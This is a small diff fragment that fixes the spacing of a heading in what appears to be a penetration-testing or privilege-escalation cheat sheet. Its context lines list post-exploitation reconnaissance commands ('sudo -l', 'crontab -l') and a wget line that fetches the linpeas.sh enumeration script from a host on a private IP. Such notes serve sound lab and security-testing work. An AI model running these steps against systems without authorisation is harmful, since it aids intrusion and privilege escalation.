@@ -79,7 +79,7 @@ sudo -l
 
 crontab -l
 
-##Linux wget and curl command
+## Linux wget and curl command
 
 wget http://192.168.64.137:8000/linpeas.sh -O linpeas.sh
 
